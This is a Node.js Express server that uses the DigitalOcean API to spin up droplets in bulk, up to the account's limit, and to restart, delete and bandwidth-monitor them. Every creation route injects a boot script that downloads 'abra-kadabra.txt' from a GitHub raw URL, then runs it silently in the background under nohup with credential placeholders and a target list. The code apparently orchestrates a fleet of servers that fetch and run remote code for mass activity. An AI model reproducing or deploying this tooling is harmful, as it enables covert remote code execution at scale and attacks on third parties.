const DigitalOcean = require("do-wrapper").default;
const express = require('express')
const fetch = require('node-fetch')
const PORT = process.env.PORT || 9898
const app = express()
const cors = require('cors')
const bodyParser = require('body-parser')

app.use(cors())
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())

const token = '';

const dateNow = () => Math.floor(Date.now() * 0.001)

const requestDO = async (resource, opts = {}) => {
  const { headers, ...restOPTS } = opts;

  const req = await fetch(`https://api.digitalocean.com/v2/${resource}`, {
    headers: {
      "Content-Type": "application/json",
      ...headers
    },
    ...restOPTS
  })

  let res;

  try {
    res = await req.json()
  } catch (e) {

  }

  return res
}

app.get('/all', async (req, res) => {
  let { droplets } = await requestDO('droplets?per_page=200', {
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })

  res.send(droplets)
})

app.get('/fill/:prefix', async (req, res) => {
  const { prefix } = req.params;

  let { droplets } = await requestDO('droplets?per_page=200', {
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })

  let { account } = await requestDO('account', {
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })

  const limit = account.droplet_limit - droplets.length;

  const names = Array(Number(limit)).fill(1).map((c, x) => `${prefix}${x + 1}`)

  console.log('droplet_limit', account.droplet_limit)
  console.log('length', droplets.length)

  const chunks = names.slice(0, limit).reduce((all, one, i) => {
    const ch = Math.floor(i / 10);
    all[ch] = [].concat((all[ch] || []), one);
    return all
  }, [])

  console.log('limit', limit)
  console.log('chunks', chunks)

  let x = []

  for (let names of chunks) {
    const c = await requestDO('droplets', {
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${req.headers['x-token']}`,
      },
      method: "POST",
      body: JSON.stringify({
        "names": names,
        "region": "fra1",
        "size": "s-1vcpu-1gb",
        "image": "ubuntu-20-04-x64",
        "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
      })
    })

    x.push(c)
  }

  res.send(x)
})

app.get('/restart/:id/:name', async (req, res) => {
  const { id, name } = req.params;

  await requestDO(`droplets/${id}`, {
    method: 'DELETE',
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })

  const c = await requestDO('droplets', {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${req.headers['x-token']}`,
    },
    method: "POST",
    body: JSON.stringify({
      "name": name,
      "region": "fra1",
      "size": "s-1vcpu-1gb",
      "image": "ubuntu-20-04-x64",
      "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
    })
  })

  res.send(c)
})

app.get('/create/:name', async (req, res) => {
  const { name } = req.params;

  const c = await requestDO('droplets', {
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
      "Content-Type": "application/json",
    },
    method: "POST",
    body: JSON.stringify({
      "name": name,
      "region": "fra1",
      "size": "s-1vcpu-1gb",
      "image": "ubuntu-20-04-x64",
      "ssh_keys": [
        29861114
      ],
      "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
    })
  })

  res.send(c)
})

app.post('/createAll', async (req, res) => {
  const { names } = req.body;

  const chunks = names.reduce((all, one, i) => {
    const ch = Math.floor(i / 10);
    all[ch] = [].concat((all[ch] || []), one);
    return all
  }, [])

  console.log(chunks)

  let x = []

  for (let names of chunks) {
    const c = await requestDO('droplets', {
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${req.headers['x-token']}`,
      },
      method: "POST",
      body: JSON.stringify({
        "names": names,
        "region": "fra1",
        "size": "s-1vcpu-1gb",
        "image": "ubuntu-20-04-x64",
        "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
      })
    })

    x.push(c)
  }

  res.send(x)
})

app.post('/perf', async (req, res) => {
  const { droplets } = req.body;

  let r = []

  for (let id of droplets) {
    let perf = await requestDO(`monitoring/metrics/droplet/bandwidth?host_id=${id}&interface=public&direction=inbound&start=${dateNow() - 60 * 30}&end=${dateNow()}`, {
      headers: {
        Authorization: `Bearer ${req.headers['x-token']}`,
      }
    })
    r.push(perf)
  }

  res.send(r)
});

app.post('/perf/:id', async (req, res) => {
  const { id } = req.params;

  let perf = await requestDO(`monitoring/metrics/droplet/bandwidth?host_id=${id}&interface=public&direction=inbound&start=${dateNow() - 60 * 30}&end=${dateNow()}`, {
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })

  res.send(perf)
});


app.delete('/all', async (req, res) => {
  let { droplets } = await requestDO('droplets', {
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })
  droplets = droplets.map(d => d.id)

  console.log(droplets)

  droplets.forEach(async (id) => {
    const d = await requestDO(`droplets/${id}`, {
      headers: {
        Authorization: `Bearer ${req.headers['x-token']}`,
      },
      method: 'DELETE',
    })
    console.log(`deleted ${id}`)
  })


  res.send('ok')
})

app.delete('/:id', async (req, res) => {
  const { id } = req.params;

  const d = await requestDO(`droplets/${id}`, {
    method: 'DELETE',
    headers: {
      Authorization: `Bearer ${req.headers['x-token']}`,
    }
  })

  console.log(`deleted ${id}`)

  res.send(req.params)
})

app.listen(PORT, () => {
  console.log(`Example app listening on port ${PORT}`)
})